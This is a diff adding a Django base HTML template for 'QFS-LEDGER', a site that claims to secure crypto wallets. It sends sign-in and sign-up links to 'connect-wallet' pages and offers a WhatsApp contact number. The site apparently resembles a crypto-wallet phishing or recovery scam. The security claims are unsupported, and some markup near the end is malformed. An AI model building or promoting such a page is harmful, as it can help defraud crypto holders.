@@ -1,0 +1,452 @@
+<!DOCTYPE html><html class="no-js" lang="zxx"><head>
+    {% load static  %}
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title> QFS-LEDGER HOME | SECURE YOUR ASSETS</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="site.webmanifest">
+    <link rel="shortcut icon" type="image/x-icon" href="{% static 'images/favicon.png'%}">
+
+    <!-- CSS here -->
+    <link rel="stylesheet" href="{% static 'css/bootstrap.min.css' %}">
+    <link rel="stylesheet" href="{% static 'css/owl.carousel.min.css' %}">
+    <link rel="stylesheet" href="{% static 'css/slicknav.css' %}">
+    <link rel="stylesheet" href="{% static 'css/flaticon.css' %}">
+    <link rel="stylesheet" href="{% static 'css/progressbar_barfiller.css' %}">
+    <link rel="stylesheet" href="{% static 'css/gijgo.css' %}">
+    <link rel="stylesheet" href="{% static 'css/animate.min.css' %}">
+    <link rel="stylesheet" href="{% static 'css/animated-headline.css' %}">
+    <link rel="stylesheet" href="{% static 'css/magnific-popup.css' %}">
+    <link rel="stylesheet" href="{% static 'css/fontawesome-all.min.css' %}">
+    <link rel="stylesheet" href="{% static 'css/themify-icons.css' %}">
+    <link rel="stylesheet" href="{% static 'css/slick.css' %}">
+    <link rel="stylesheet" href="{% static 'css/nice-select.css' %}">
+    <link rel="stylesheet" href="{% static 'css/style.css' %}">
+   
+<script src="{% static 'js/jquery.min.js' %}"></script>
+
+<style>
+.body {font-family: Century Gothic;}
+body {
+    font-family: Arial, sans-serif;
+    margin: 0;
+    padding: 0px;
+}
+
+form {
+    max-width: 100%;
+    margin: 0 auto;
+    background-color: #fff;
+    padding: 10px;
+    border-radius: 8px;
+    box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+}
+
+label {
+    display: block;
+    font-weight: bold;
+    margin-bottom: 8px;
+}
+
+input[type="number"],
+select {
+    width: 100%;
+    padding: 10px;
+    margin-bottom: 20px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+}
+
+input[type="button"] {
+    width: 100%;
+    padding: 10px;
+    background-color: #007bff;
+    color: #fff;
+    border: none;
+    border-radius: 4px;
+    cursor: pointer;
+}
+
+input[type="button"]:hover {
+    background-color: #0056b3;
+}
+
+#exchangeResult {
+    margin-top: 20px;
+    padding: 2px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    background-color: #fff;
+}
+
+</style>
+    <script src="{% static 'js/jquery.min.js' %}"></script>
+    <script src="{% static 'js/myscript.js' %}"></script>
+</head>
+<body class="body">
+    <!-- ? Preloader Start -->
+    <div id="preloader-active">
+        <div class="preloader d-flex align-items-center justify-content-center">
+            <div class="preloader-inner position-relative">
+                <div class="preloader-circle"></div>
+                <div class="preloader-img pere-text">
+                    <img src="{% static 'images/loder.png'%}" alt="" style="width:12em;">
+                </div>
+            </div>
+        </div>
+    </div>
+    <!-- Preloader Start -->
+    <header>
+        <!-- Header Start -->
+        <div class="header-area header-transparent">
+            <div class="main-header ">
+                <div class="header-bottom  header-sticky">
+                    <div class="container-fluid">
+                        <div class="row align-items-center">
+                            <!-- Logo -->
+                            <div class="col-xl-2 col-lg-2">
+                                <div class="logo">
+                                    <a href="https://qfsdigital-ledger.com"><img src="{% static 'images/logo.png'%}" alt="" styloe="width:200px;"></a>
+                                </div>
+                            </div>
+                            <div class="col-xl-10 col-lg-10">
+                                <div class="menu-wrapper d-flex align-items-center justify-content-end">
+                                    <!-- Main-menu -->
+                                    <div class="main-menu d-none d-lg-block">
+                                        <nav>
+                                            <ul id="navigation">
+                                                <li><a href="faq">FAQ</a></li>
+                                                <li><a href="#exchangeForm">EXCHANGE</a></li>
+                                       <li><a href="./connect-wallet/connect-wallet">SIGN-IN</a></li>
+                                                <li><a href="./connect-wallet/assign-wallet" onclick="">SIGN-UP</a></li>
+                                               
+                                            </ul>
+                                        </nav>
+                                    </div>
+                                </div>
+                            </div> 
+							
+                            <!-- Mobile Menu -->
+                            <div class="col-12">
+                                <div class="mobile_menu d-block d-lg-none"></div>
+                            </div>
+                        </div>
+                    </div>
+					
+                </div>
+<script src="{% static 'js/coingecko-coin-price-marquee-widget.js' %}"></script>
+<coingecko-coin-price-marquee-widget coin-ids="bitcoin,eos,ethereum,litecoin,ripple,usdt-yvault,usdtez,shiba,shiba-bsc,shiba-ceo" currency="usd" background-color="#ffffff" locale="en" font-color="#6d0ea0"></coingecko-coin-price-marquee-widget>
+            </div>
+        </div>
+		
+        <!-- Header End -->
+    </header>
+	<!-- main -->
+    {% block content %}
+    {% endblock content %}
+
+
+
+<footer>
+    <div class="footer-wrappr " data-background="assets/img/gallery/footer-bg.png'%}">
+        <div class="footer-area footer-padding ">
+            <div class="container">
+                <div class="row d-flex justify-content-between">
+                    <div class="col-xl-3 col-lg-4 col-md-6 col-sm-6">
+                        <div class="single-footer-caption mb-50">
+                            <!-- logo -->
+                            <div class="footer-logo mb-25">
+                                <a href="https://qfsdigital-ledger.com"><img src="{% static 'images/logo2_footer.png'%}" alt="" style="width:200px;height:50px;"></a>
+                            </div>
+                            <div class="footer-tittle mb-50">
+                                <p>Our cloud security for data assets storage of ledger is topnotch, don't feel less secured, feel like a boss.</p>
+                            </div>
+                            <!-- Form -->
+                            <div class="footer-form">
+                                <div id="mc_embed_signup">
+                                    <form target="_blank" action="https://spondonit.us12.list-manage.com/subscribe/post?u=1462626880ade1ac87bd9c93a&amp;id=92a4423d01" method="get" class="subscribe_form relative mail_part" novalidate="true">
+                                            <div class="form-icon" align="center">
+                                            <img src="{% static 'images/andro.png'%}" id="newsletter-submit" style="width:10em;cursor:pointer;">
+                                        </div>
+                                        <br>
+                                        <div class="form-icon" align="center">
+                                            <img src="{% static 'images/andriod.png'%}" id="newsletter-submit" style="width:10em;cursor:pointer">
+                                            <br>
+                                                <b>Download Now</b>
+
+                                        </div>
+                                        <div class="mt-10 info"></div>
+                                    </form>
+                                </div>
+                            </div>
+                            <!-- social -->
+                            <div class="footer-social mt-50">
+                                <a href="#"><i class="fab fa-twitter"></i></a>
+                                <a href="#"><i class="fab fa-facebook-f"></i></a>
+                                <a href="#"><i class="fab fa-pinterest-p"></i></a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xl-1 col-lg-1 col-md-1 col-sm-1"></div>
+                    <div class="col-xl-2 col-lg-2 col-md-4 col-sm-5">
+    <div class="single-footer-caption mb-50">
+        <div class="footer-tittle">
+            <h4>Buy Crypto</h4>
+            <ul>
+                <li><a href="https://www.binance.com">Binance</a></li>
+                <li><a href="https://www.coinbase.com">Coinbase</a></li>
+                <li><a href="https://www.moonpay.com">Moonpay</a></li>
+                <li><a href="https://www.kraken.com">Kraken</a></li>
+                <li><a href="https://www.bitstamp.net">Bitstamp</a></li>
+                <li><a href="https://www.bitfinex.com">Bitfinex</a></li>
+                <li><a href="https://www.bittrex.com">Bittrex</a></li>
+                <li><a href="https://www.gemini.com">Gemini</a></li>
+                <li><a href="https://www.huobi.com">Huobi</a></li>
+                <li><a href="https://www.uphold.com">Uphold</a></li>
+                <li><a href="https://www.cex.io">CEX.IO</a></li>
+                <li><a href="https://www.okcoin.com">OKCoin</a></li>
+                <li><a href="https://www.cryptocompare.com">CryptoCompare</a></li>
+                <li><a href="https://www.etoro.com">eToro</a></li>
+                <li><a href="https://www.hitbtc.com">HitBTC</a></li>
+                <li><a href="https://www.poloniex.com">Poloniex</a></li>
+                <!-- Add more companies below -->
+                <!-- <li><a href="URL">Company Name</a></li> -->
+            </ul>
+        </div>
+    </div>
+</div>
+
+                    <div class="col-xl-2 col-lg-2 col-md-4 col-sm-5">
+    <div class="single-footer-caption mb-50">
+        <div class="footer-tittle">
+            <h4>Wallets We Secure</h4>
+            <ul>
+                <li><a href="#">BTC (Bitcoin)</a></li>
+                <li><a href="#">ETH (Ethereum)</a></li>
+                <li><a href="#">USDT (Tether)</a></li>
+                <li><a href="#">XRP (Ripple)</a></li>
+                <li><a href="#">SHIB (Shiba Inu)</a></li>
+                <li><a href="#">ADA (Cardano)</a></li>
+                <li><a href="#">DOGE (Dogecoin)</a></li>
+                <li><a href="#">SOL (Solana)</a></li>
+                <li><a href="#">DOT (Polkadot)</a></li>
+                <li><a href="#">LUNA (Terra)</a></li>
+                <li><a href="#">AVAX (Avalanche)</a></li>
+                <li><a href="#">LINK (Chainlink)</a></li>
+                <li><a href="#">MATIC (Polygon)</a></li>
+                <li><a href="#">ALGO (Algorand)</a></li>
+                <li><a href="#">ATOM (Cosmos)</a></li>
+                <li><a href="#">VET (VeChain)</a></li>
+                <!-- Add more cryptocurrencies below -->
+                <!-- <li><a href="#">CRYPTO ABBREVIATION (Cryptocurrency Name)</a></li> -->
+            </ul>
+        </div>
+    </div>
+</div>
+
+                    <div class="col-xl-2 col-lg-2 col-md-4 col-sm-5">
+                        <div class="single-footer-caption mb-50">
+                            <div class="footer-tittle">
+                                <h4>Support</h4>
+                                <ul>
+                                    <li><a href="./connect-wallet/connect-wallet">SIGN-IN</a></li>
+                                    <li><a href="./connect-wallet/assign-wallet">SIGN-UP</a></li>
+                                    <li><a href="#">TECHNOLOGY</a></li>
+                                    <li><a href="#">CRYPTO'S</a></li>
+                                    <li><a href="#">NFT CUPONS</a></li>
+                                    <li><a href="#">WALLET CUPONS</a></li>
+                                    <li><a href="#">ASSET MINING</a></li>
+                                    <li><a href="faq">FAQ</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!-- footer-bottom area -->
+        <div class="footer-bottom-area">
+            <div class="container">
+                <div class="footer-border">
+                    <div class="row">
+                        <div class="col-xl-12">
+                            <div class="footer-copy-right text-center">
+                                <p>
+                                  Copyright ©2019 - <script>document.write(new Date().getFullYear());</script>2024 All rights reserved | Contact Our <i class="fa fa-phone" aria-hidden="true"></i> <a href="mailto:support@qfsdigital-ledger.com" id="support" target="_blank">Support Team </a>
+                                 </p>
+
+                              </div>
+                          </div>
+                      </div>
+                  </div>
+              </div>
+          </div>
+      </div>
+  </footer>
+  <!-- Scroll Up -->
+  <div id="back-top">
+    <a title="Go to Top" href="#"> <i class="fas fa-level-up-alt"></i></a>
+</div>
+<title></title>
+ <style>
+/* Button used to open the chat form - fixed at the bottom of the page */
+.open-button {
+  background-color: #555;
+  color: white;
+  padding: 16px 20px;
+  border: none;
+  cursor: pointer;
+  opacity: 0.8;
+  position: fixed;
+  bottom: 23px;
+  right: 28px;
+  width: 280px;
+}
+.fa-whatsapp {
+  color: green;
+  /*border-radius:100%;*/
+
+  /*padding: 16px 20px;*/
+  border: none;
+  cursor: pointer;
+  /*opacity: 0.8;*/
+  position: fixed;
+  bottom: 23px;
+  left: 28px;
+  /*width: 280px;*/
+  font-size:22px;
+  border-radius:20px;
+}
+.fa-whatsapp:hover{
+	color:black;
+    margin-top:-20px;
+    margin-bottom:+5px;
+    opacity:1.8;
+    transition:0.30;
+    }
+/* The popup chat - hidden by default */
+.chat-popup {
+  display: none;
+  position: fixed;
+  bottom: 0;
+  left: 15px;
+  border: 3px solid #f1f1f1;
+  z-index: 15;
+}
+/* Add styles to the form container */
+.form-container {
+  max-width: 300px;
+  padding: 10px;
+  background-color: white;
+}
+/* Full-width textarea */
+.form-container textarea {
+  width: 100%;
+  padding: 15px;
+  margin: 5px 0 22px 0;
+  border: none;
+  background: #f1f1f1;
+  resize: none;
+  min-height: 120px;
+}
+.form-container input[type=number]{
+  width: 100%;
+  padding: 10px;
+  margin: 5px 0 10px 0;
+  border: none;
+  background: #f1f1f1;
+  resize: none;
+  min-height: 15px;
+}
+
+/* When the textarea gets focus, do something */
+.form-container textarea:focus {
+  background-color: #ddd;
+  outline: none;
+}
+/* Set a style for the submit/send button */
+.form-container .btn {
+  background-color: #04AA6D;
+  color: white;
+  padding: 10px 20px;
+  border: none;
+  cursor: pointer;
+  width: 100%;
+  margin-bottom:10px;
+  opacity: 0.8;
+}
+
+/* Add a red background color to the cancel button */
+.form-container .cancel {
+  background-color: red;
+}
+/* Add some hover effects to buttons */
+.form-container .btn:hover, .open-button:hover {
+  opacity: 1;
+}
+</style>
+  <!-- Icon Font Stylesheet -->
+<link href="{% static 'js/all.min.css' %}' %}" rel="stylesheet">
+
+
+<button class="fa fa-whatsapp" onclick="javascript:openForm_(this);" name="name_" id="myForm_">Whatsapp<img src="{% static 'images/whatsappp.png'%}" style="width:50px;height:50px;"></button>
+<script>
+function openForm_(mybtn) {
+  location.href="https://api.whatsapp.com/send/?phone=%2B18299792616&text&type=phone_number&app_absent=0"
+}
+</script>
+    
+        
+           
+
+.js' %}"
+
+<script src="{% static 'js/modernizr-3.5.0.min></script>
+<!-- Jquery, Popper, Bootstrap -->
+<script src="{% static 'js/jquery-1.12.4.min.js' %}"></script>
+<script src="{% static 'js/popper.min.js' %}"></script>
+<script src="{% static 'js/bootstrap.min.js' %}"></script>
+<!-- Jquery Mobile Menu -->
+<script src="{% static 'js/jquery.slicknav.min.js' %}"></script>
+
+<!-- Jquery Slick , Owl-Carousel Plugins -->
+<script src="{% static 'js/owl.carousel.min.js' %}"></script>
+<script src="{% static 'js/slick.min.js' %}"></script>
+<!-- One Page, Animated-HeadLin -->
+<script src="{% static 'js/wow.min.js' %}"></script>
+<script src="{% static 'js/animated.headline.js' %}"></script>
+<script src="{% static 'js/jquery.magnific-popup.js' %}"></script>
+
+<!-- Date Picker -->
+<script src="{% static 'js/gijgo.min.js' %}"></script>
+
+<!-- Video bg -->
+<script src="{% static 'js/jquery.vide.js' %}"></script>
+
+<!-- Nice-select, sticky -->
+<script src="{% static 'js/jquery.nice-select.min.js' %}"></script>
+<script src="{% static 'js/jquery.sticky.js' %}"></script>
+<!-- Progress -->
+<script src="{% static 'js/jquery.barfiller.js' %}"></script>
+
+<!-- counter , waypoint,Hover Direction -->
+<script src="{% static 'js/jquery.counterup.min.js' %}"></script>
+<script src="{% static 'js/waypoints.min.js' %}"></script>
+<script src="{% static 'js/jquery.countdown.min.js' %}"></script>
+<script src="{% static 'js/hover-direction-snake.min.js' %}"></script>
+
+<!-- contact js -->
+<script src="{% static 'js/contact.js' %}"></script>
+<script src="{% static 'js/jquery.form.js' %}"></script>
+<script src="{% static 'js/jquery.validate.min.js' %}"></script>
+<script src="{% static 'js/mail-script.js' %}"></script>
+<script src="{% static 'js/jquery.ajaxchimp.min.js' %}"></script>
+
+<!-- Jquery Plugins, main Jquery -->	
+<script src="{% static 'js/plugins.js' %}"></script>
+<script src="{% static 'js/main.js' %}"></script>
+<script src="{% static 'js/le6jgwlfygc3hxufqxkmqmr513xchzob.js' %}" async=""></script>
+
+
+</body></html><!-- JS here -->
